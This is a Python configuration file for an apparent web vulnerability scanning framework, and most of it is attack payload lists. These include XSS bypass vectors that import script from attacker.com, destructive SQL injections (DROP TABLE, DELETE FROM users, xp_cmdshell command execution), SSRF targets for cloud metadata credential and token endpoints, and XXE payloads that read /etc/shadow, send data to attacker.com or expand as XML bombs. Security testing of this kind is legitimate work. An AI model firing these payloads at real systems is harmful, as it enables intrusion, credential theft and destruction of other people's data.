"""
Configuration and constants for the vulnerability discovery framework
"""
import os
from pathlib import Path

# Project root
PROJECT_ROOT = Path(__file__).parent.parent
OUTPUT_DIR = PROJECT_ROOT / "output"
TEMPLATES_DIR = PROJECT_ROOT / "templates"

# Create directories if they don't exist
OUTPUT_DIR.mkdir(exist_ok=True)
TEMPLATES_DIR.mkdir(exist_ok=True)

# ============ TOOL CONFIGURATION ============

# Required external tools
REQUIRED_TOOLS = {
    'nuclei': 'nuclei -h',
    'gau': 'gau --version',
    'waybackurls': 'waybackurls -h',
    'katana': 'katana -h',
    'paramspider': 'paramspider -h',
    'httpx': 'httpx -h',
}

# Optional tools
OPTIONAL_TOOLS = {
    'dalfox': 'dalfox -h',
    'sqlmap': 'sqlmap --version',
    'gf': 'gf -h',
}

# ============ SCANNING CONFIGURATION ============

# Threading/Async settings
MAX_WORKERS = 10
MAX_RETRIES = 3
TIMEOUT = None  # No timeout - let scanner run as long as needed

# Rate limiting (requests per second)
RATE_LIMIT = 20

# Batch sizes for processing
BATCH_SIZE = 50

# ============ URL COLLECTION ============

# Maximum URLs to process (to avoid excessive scanning)
MAX_URLS = 10000

# Exclude patterns (regex)
EXCLUDE_PATTERNS = [
    r'.*\.(jpg|jpeg|png|gif|css|js|woff|woff2|eot|ttf|svg|ico|xml)(\?.*)?$',
    r'.*logout.*',
    r'.*signout.*',
]

# ============ XSS SCANNING ============

# Path-based XSS injection payloads (for URL path segments)
# These are used to test injection in URL paths like /user/{payload}/settings
PATH_XSS_PAYLOADS = {
    'path_basic_script': '"><script>alert(1)</script>',
    'path_basic_img': '"><img src=x onerror="alert(1)">',
    'path_svg': '"><svg onload="alert(1)">',
    'path_event': '" onload="alert(1)" x="',
    'path_comment_escape': '"/**/onload="alert(1)""',
    'path_double_url': '%2522%253Cimg%2520src%253Dx%2520onerror%253D%2522alert(1)%2522%253E',
    'path_unicode': '\\u0022\\u003Eimg\\u0020src\\u003Dx\\u0020onerror\\u003D\\u0022alert(1)\\u0022',
    'path_slash_escape': '/\"><script>alert(1)</script>',
    'path_question_escape': '?"><script>alert(1)</script>',
    'path_hash_escape': '#"><script>alert(1)</script>',
    'path_semicolon': ';"><img src=x onerror="alert(1)">',
    'path_dot_escape': '."><img src=x onerror="alert(1)">',
    'path_double_dot': '../"><img src=x onerror="alert(1)">',
}

# Custom parameter injection payloads (add new params with XSS)
CUSTOM_PARAM_PAYLOADS = {
    'custom_xss_debug': '"><script>alert(1)</script>',
    'custom_xss_param': '"><img src=x onerror="alert(1)">',
    'custom_xss_test': '" onmouseover="alert(1)" test="',
    'custom_xss_hidden': '" style="display:none" onload="alert(1)" x="',
    'custom_xss_encoded': '&quot;&gt;&lt;img src=x onerror=&quot;alert(1)&quot;&gt;',
}

# Custom parameter names to inject (common patterns)
CUSTOM_PARAM_NAMES = [
    'test', 'debug', 'param', 'value', 'input', 'data', 'payload',
    'xss', 'injection', 'keyword', 'search', 'q', 'query', 'id', 'user',
    'username', 'password', 'email', 'comment', 'message', 'name',
    'callback', 'url', 'redirect', 'return', 'next', 'continue',
    'page', 'category', 'type', 'sort', 'filter', 'tag', 'ref'
]

# Advanced XSS payloads (WAF bypass, event handler alternatives, encoding tricks)
XSS_PAYLOADS = {
    # Basic escaping
    'basic_script': '"><script>alert(1)</script>',
    'basic_img': '"><img src=x onerror="alert(1)">',
    
    # Event handlers
    'autofocus_event': '" autofocus onfocus="alert(1)" x="',
    'oninput': '" oninput="alert(1)" x="',
    'onchange': '" onchange="alert(1)" x="',
    'onmouseenter': '" onmouseenter="alert(1)" x="',
    'onmouseover': '" onmouseover="alert(1)" x="',
    'onfocus': '" onfocus="alert(1)" x="',
    'onblur': '" onblur="alert(1)" x="',
    'onload': '" onload="alert(1)" x="',
    'ontouchstart': '" ontouchstart="alert(1)" x="',
    'onkeydown': '" onkeydown="alert(1)" x="',
    'onwheel': '" onwheel="alert(1)" x="',
    'onscroll': '" onscroll="alert(1)" x="',
    'oncontextmenu': '" oncontextmenu="alert(1)" x="',
    
    # SVG vectors
    'svg_onload': '"><svg onload="alert(1)">',
    'svg_onerror': '"><svg/onerror="alert(1)">',
    'svg_animate': '"><svg><animate attributeName="x" values="0;1" dur="1s" onend="alert(1)"/>',
    'svg_set': '"><svg><set attributeName="onmouseover" to="alert(1)"/>',
    
    # HTML5 features
    'video_onerror': '"><video src=x onerror="alert(1)">',
    'audio_onerror': '"><audio src=x onerror="alert(1)">',
    'details_ontoggle': '"><details ontoggle="alert(1)">',
    'marquee': '"><marquee onstart="alert(1)">',
    'dialog_open': '"><dialog open onmouseenter="alert(1)">',
    
    # Content Visibility (modern bypass)
    'content_visibility': '"/><style>@import"//attacker.com";</style><iframe oncontentvisibilityautostatechange="alert(1)',
    'oncontentvisibilityautostatechange': '" oncontentvisibilityautostatechange="alert(1)" x="',
    'oncontentvisibilityautostatechange_import': '"><iframe oncontentvisibilityautostatechange="import(\'//attacker.com\')" style="display:block;content-visibility:auto">',
    'oncontentvisibilityautostatechange_payload': '"oncontentvisibilityautostatechange=import(\'//cm2.pw\') style=display:block;content-visibility:auto>',
    
    # Less common events
    'onpageshow': '" onpageshow="alert(1)" x="',
    'onpagehide': '" onpagehide="alert(1)" x="',
    'onbeforeunload': '" onbeforeunload="alert(1)" x="',
    'onunload': '" onunload="alert(1)" x="',
    'onresize': '" onresize="alert(1)" x="',
    
    # Form events
    'onsubmit': '"><form onsubmit="alert(1)"><input type=submit>',
    'onreset': '"><form onreset="alert(1)"><input type=reset>',
    'onselect': '"><input type=text onselect="alert(1)">',
    
    # SVG attribute injection
    'svg_attributes': '"><svg width=100 height=100><circle cx=50 cy=50 r=40 stroke="black" stroke-width=3 fill="red" onclick="alert(1)"/>',
    
    # Data URL
    'data_url': '"><iframe src="data:text/html,<script>alert(1)</script>">',
    'data_img': '"><img src="data:text/html,<script>alert(1)</script>">',
    
    # Object/Embed
    'object': '"><object data="javascript:alert(1)">',
    'embed': '"><embed src="javascript:alert(1)">',
    
    # CSS-based (expression in IE - legacy but still tested)
    'css_expression': '"><div style="background:url(javascript:alert(1))">',
    'css_behavior': '"><div style="behavior:url(#default#AdobeFlash)" onError="alert(1)">',
    
    # Base tag hijacking
    'base_tag': '"><base href="//attacker.com/">',
    
    # Mutation-based XSS
    'mutation_xss': '"><math><mi xlink:href="data:text/html,<script>alert(1)</script>">xss</mi></math>',
    
    # Character encoding bypass
    'unicode_escape': '&#60;script&#62;alert(1)&#60;/script&#62;',
    'hex_encode': '%3Cscript%3Ealert(1)%3C/script%3E',
    'mixed_encoding': '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;',
    
    # Protocol handlers
    'vbscript': '"><img src="vbscript:alert(1)">',
    'mhtml': '"><link rel="stylesheet" href="mhtml:http://attacker.com/payload.html!xss.css">',
    
    # NoScript bypass
    'noscript': '"><noscript><img src=x onerror="alert(1)"></noscript>',
    
    # Newline/null injection
    'newline_inject': '" onmouseover="alert(1)"\n x="',
    'null_byte': '"><img src=x onerror="alert(1)"\x00 x="',
    
    # Double encoding
    'double_url': '%253Cscript%253Ealert(1)%253C/script%253E',
    
    # Case variation
    'case_variation': '"><ScRiPt>alert(1)</ScRiPt>',
    'script_uppercase': '"><SCRIPT>alert(1)</SCRIPT>',
}

# XSS detection strings (case-insensitive)
XSS_DETECTION = [
    'alert',
    'confirm',
    'prompt',
    'onerror',
    'onload',
    '<script',
    'javascript:',
]

# ============ SQLI SCANNING ============

# Advanced SQLi payloads with various techniques
SQLI_PAYLOADS = {
    'error_based': [
        "' OR '1'='1",
        "' OR 1=1 -- -",
        "admin' -- -",
        "' UNION SELECT NULL -- -",
        "1' AND '1'='1",
        # MySQL specific
        "' OR /*!50000'1'='1",
        "' /*!40000AND*/ 1=1 -- -",
        # MSSQL specific
        "' OR 1=1--",
        "'; DROP TABLE users--",
        # Oracle specific
        "' OR '1'='1' AND '1'='1",
        # PostgreSQL
        "' OR ''='",
        # Advanced error-based
        "' AND extractvalue(1,concat(0x7e,(select version())))-- -",
        "' AND updatexml(1,concat(0x7e,(select user())),1)-- -",
        "1' AND(SELECT*FROM(SELECT(SLEEP(5)))a)-- -",
        # Double URL encoded
        "%2527%20OR%20%25271%2527%253D%25271",
        # Hex encoded
        "0x31 OR 0x31=0x31",
        # Comments bypass
        "' /*!50000UNION SELECT NULL*/ -- -",
        # Inline comments
        "/**/OR/**/1=1-- -",
    ],
    'boolean_based': [
        "' AND '1'='1",
        "' AND '1'='2",
        "' AND 1=1 -- -",
        "' AND 1=2 -- -",
        # UNION-based
        "' UNION SELECT NULL,NULL,NULL -- -",
        "1' UNION SELECT database(),user(),version() -- -",
        # Blind boolean
        "' AND SUBSTRING(user(),1,1)='r' -- -",
        "' AND SUBSTRING(version(),1,1)='5' -- -",
        # Time-based boolean blind
        "' AND IF(1=1,SLEEP(5),0) -- -",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- -",
        # String comparison
        "' AND 'a'='a",
        "' AND 'a'='b",
        # Parenthesis bypass
        "' AND(1=1)-- -",
        "' OR(1=1)-- -",
    ],
    'time_based': [
        "' AND SLEEP(5) -- -",
        "' AND BENCHMARK(5000000,SHA1('test')) -- -",
        "'; WAITFOR DELAY '00:00:05'-- -",
        # MySQL
        "' AND SLEEP(5)#",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- -",
        "' AND IF(1=1,SLEEP(5),0) -- -",
        # PostgreSQL
        "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) -- -",
        # MSSQL
        "'; EXEC sp_OACreate 'WScript.Shell',@shell OUT;EXEC sp_OAMethod @shell,'Run',Null,'cmd /c ping -n 5 127.0.0.1';--",
        "'; WAITFOR DELAY '00:00:05' --",
        # Oracle
        "' AND (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE DBMS_LOCK.SLEEP(0) END FROM DUAL) -- -",
        # Advanced evasion
        "' /*!50000AND*/ SLEEP(5) -- -",
        "' /**/AND/**/ SLEEP(5) -- -",
        # Alternative functions
        "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_SCHEMA=database() AND SLEEP(5))-- -",
    ],
    'union_based': [
        "' UNION SELECT NULL -- -",
        "' UNION SELECT NULL,NULL -- -",
        "' UNION SELECT NULL,NULL,NULL -- -",
        "' UNION SELECT NULL,NULL,NULL,NULL -- -",
        "' UNION SELECT 1,database(),3 -- -",
        "' UNION SELECT 1,user(),3 -- -",
        "' UNION SELECT 1,version(),3 -- -",
        "' UNION SELECT 1,table_name,3 FROM information_schema.tables -- -",
        "' UNION SELECT 1,column_name,3 FROM information_schema.columns -- -",
        # Multiline comments
        "' /*!UNION/*/ SELECT NULL -- -",
    ],
    'stacked_queries': [
        "'; DROP TABLE users -- -",
        "'; INSERT INTO users VALUES(1,'admin','password') -- -",
        "'; UPDATE users SET password='hacked' -- -",
        "'; DELETE FROM users -- -",
        "'; EXEC xp_cmdshell('dir') -- -",
    ],
}

# SQLi detection strings
SQLI_DETECTION = [
    'syntax error',
    'mysql_fetch',
    'mysql error',
    'warning: mysql',
    'unclosed quotation mark',
    'quoted string not properly terminated',
    'sql syntax',
    'postgresql error',
]

# ============ SSRF CONFIGURATION ============

SSRF_PAYLOADS = [
    # Localhost variations
    'http://localhost:22',
    'http://localhost:80',
    'http://localhost:443',
    'http://localhost:3000',
    'http://localhost:5000',
    'http://localhost:8000',
    'http://localhost:8080',
    'http://localhost:8443',
    'http://localhost:9000',
    'http://localhost:27017',  # MongoDB
    'http://localhost:5432',   # PostgreSQL
    'http://localhost:3306',   # MySQL
    'http://localhost:6379',   # Redis
    'http://localhost:27017',  # MongoDB
    'http://localhost:11211',  # Memcached
    'http://localhost:9200',   # Elasticsearch
    
    # 127.0.0.1 variations
    'http://127.0.0.1:22',
    'http://127.0.0.1:80',
    'http://127.0.0.1:443',
    'http://127.0.0.1:3000',
    'http://127.0.0.1:5000',
    'http://127.0.0.1:8000',
    'http://127.0.0.1:8080',
    'http://127.0.0.1:8443',
    'http://127.0.0.1:9000',
    'http://127.0.0.1:27017',
    'http://127.0.0.1:5432',
    'http://127.0.0.1:3306',
    'http://127.0.0.1:6379',
    'http://127.0.0.1:11211',
    'http://127.0.0.1:9200',
    
    # AWS metadata endpoints
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://169.254.169.254/latest/user-data/',
    'http://169.254.169.254/latest/meta-data/public-keys/',
    'http://169.254.169.254/latest/meta-data/instance-type',
    'http://169.254.169.254/latest/meta-data/local-ipv4',
    'http://169.254.169.254/latest/meta-data/ami-id',
    'http://169.254.169.254/latest/meta-data/iam/info',
    
    # Azure metadata
    'http://169.254.169.254/metadata/instance?api-version=2017-08-01',
    'http://169.254.169.254/metadata/instance/compute/vmId?api-version=2017-08-01',
    'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01',
    
    # Google Cloud metadata
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
    'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity',
    
    # Alibaba Cloud metadata
    'http://100.100.100.200/latest/meta-data/',
    
    # Digital Ocean metadata
    'http://169.254.169.254/metadata/v1',
    'http://169.254.169.254/metadata/v1/user-data',
    
    # Private network ranges
    'http://10.0.0.1:80',
    'http://10.0.0.1:8080',
    'http://10.0.0.1:3000',
    'http://172.16.0.1:80',
    'http://172.16.0.1:8080',
    'http://192.168.0.1:80',
    'http://192.168.1.1:80',
    'http://192.168.1.1:8080',
    
    # Common service ports
    'http://localhost:5985',   # WinRM
    'http://localhost:5986',   # WinRM SSL
    'http://localhost:8086',   # InfluxDB
    'http://localhost:7474',   # Neo4j
    'http://localhost:4242',   # OpenTSDB
    'http://localhost:50070',  # Hadoop
    'http://localhost:16010',  # HBase
    'http://localhost:2181',   # Zookeeper
    'http://localhost:4369',   # Erlang
    'http://localhost:9042',   # Cassandra
    
    # Docker socket
    'unix:///var/run/docker.sock',
    
    # Gopher protocol
    'gopher://localhost:22',
    'gopher://127.0.0.1:22',
    
    # File protocol
    'file:///etc/passwd',
    'file:///etc/hosts',
    'file:///windows/win.ini',
    
    # Admin panels
    'http://localhost/admin',
    'http://localhost/administrator',
    'http://localhost/phpmyadmin',
    'http://localhost/cpanel',
    'http://localhost/webhome',
    'http://localhost/actuator',  # Spring Boot
    'http://127.0.0.1/admin',
    'http://127.0.0.1/administrator',
    'http://127.0.0.1/phpmyadmin',
    
    # Different protocols
    'https://localhost/latest/meta-data/',
    'https://169.254.169.254/latest/meta-data/',
    'https://metadata.google.internal/computeMetadata/v1/',
    
    # Encoded variations
    'http://localhost%00.example.com:80',
    'http://127.0.0.1%00.example.com:80',
    
    # Alternative localhost names
    'http://0:80',
    'http://0.0.0.0:80',
    'http://0.0.0:80',
]

# ============ XXE CONFIGURATION ============

XXE_PAYLOADS = [
    # Basic file inclusion
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>',
    
    # Windows paths
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><root>&xxe;</root>',
    
    # Billion laughs attack (XML bomb)
    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">]><lolz>&lol4;</lolz>',
    
    # Parameter entity injection
    '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM \'http://attacker.com/?data=%xxe;\'>%exfiltrate;">%eval;]><root/>',
    
    # Blind XXE with OOB (Out of Band)
    '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://attacker.com/exfil">]><foo>&xxe;</foo>',
    
    # XXE with internal entity resolution
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY internal "Internal Data"><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    
    # Data protocol XXE
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "data:text/plain,XXE">]><foo>&xxe;</foo>',
    
    # Nested entity expansion
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY a "1234567890"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]><foo>&c;</foo>',
    
    # XXE with SYSTEM identifier
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % dtd SYSTEM "file:///etc/passwd">%dtd;]><root/>',
    
    # Compressed entity expansion
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">]><foo>&lol5;</foo>',
    
    # XXE through SOAP/WSDL
    '<?xml version="1.0" encoding="UTF-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://www.webserviceX.NET/"><!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Body><tns:ConversionRate><From>&xxe;</From></tns:ConversionRate></soap:Body></soap:Envelope>',
    
    # XXE with external DTD reference
    '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd"><foo/>',
    
    # XXE with base64 encoding
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
    
    # XXE with common application paths
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///opt/app/database.yml">]><foo>&xxe;</foo>',
    
    # XXE with XSLT
    '<?xml version="1.0"?><!DOCTYPE xsl:stylesheet [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:value-of select="&xxe;"/></xsl:stylesheet>',
    
    # Quadratic blowup entity attack
    '<?xml version="1.0"?><!DOCTYPE bomb [<!ENTITY a "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx">]><bomb>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</bomb>',
]

# ============ LFI CONFIGURATION ============

LFI_PAYLOADS = [
    '../../../etc/passwd',
    '../../etc/passwd',
    '../etc/passwd',
    'etc/passwd',
    '/etc/passwd',
    '....//....//....//etc/passwd',
    '..;/..;/..;/etc/passwd',
]

# ============ OPEN REDIRECT ============

REDIRECT_PAYLOADS = [
    'http://evil.com',
    'https://attacker.com',
    '//evil.com',
    '///attacker.com',
]

# ============ NUCLEI CONFIGURATION ============

NUCLEI_TAGS = ['cve', 'misconfig', 'exposure', 'xss', 'sqli', 'ssrf', 'lfi', 'redirect', 'xxe']
NUCLEI_SEVERITY = ['critical', 'high', 'medium']
NUCLEI_TIMEOUT = 300  # seconds per template

# ============ REPORTING ============

REPORT_FORMATS = ['json', 'html', 'txt']
SEVERITY_LEVELS = {
    'critical': 4,
    'high': 3,
    'medium': 2,
    'low': 1,
    'info': 0,
}

# ============ JS ANALYSIS ============

# Patterns to extract from JavaScript
JS_ENDPOINT_PATTERNS = [
    r'["\']\/api\/[^"\']+["\']',
    r'["\']\/v\d+\/[^"\']+["\']',
    r'(?:url|endpoint|path|api)\s*[:=]\s*["\']([^"\']+)["\']',
]

# Sink patterns that indicate potential XSS
XSS_SINK_PATTERNS = [
    r'\.innerHTML\s*=',
    r'\.outerHTML\s*=',
    r'\.write\s*\(',
    r'\.writeln\s*\(',
    r'eval\s*\(',
    r'Function\s*\(',
    r'document\.body\.innerHTML',
    r'element\.innerHTML',
    r'insertAdjacentHTML',
]

# ============ NUCLEI TEMPLATES ============

# Templates directory (will be cloned/managed)
NUCLEI_TEMPLATES_REPO = 'https://github.com/projectdiscovery/nuclei-templates.git'
NUCLEI_TEMPLATES_DIR = PROJECT_ROOT / 'nuclei-templates'

# ============ LOGGING ============

LOG_DIR = PROJECT_ROOT / 'logs'
LOG_DIR.mkdir(exist_ok=True)

LOG_LEVEL = 'INFO'
LOG_FORMAT = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
LOG_FILE = LOG_DIR / 'scanner.log'

# ============ FEATURE FLAGS ============

# Enable/disable specific scanners
ENABLE_XSS = True
ENABLE_SQLI = True
ENABLE_SSRF = True
ENABLE_XXE = True
ENABLE_LFI = True
ENABLE_REDIRECT = True
ENABLE_IDOR = True
ENABLE_NUCLEI = True

# Skip static asset scanning
SKIP_STATIC_ASSETS = True

# Resume from previous state
RESUME_CAPABILITY = True

# ============ VALIDATION ============

# User-Agent for HTTP requests
USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'

# Maximum response size to analyze (MB)
MAX_RESPONSE_SIZE = 10

# Domains to exclude (internal testing)
EXCLUDE_DOMAINS = []
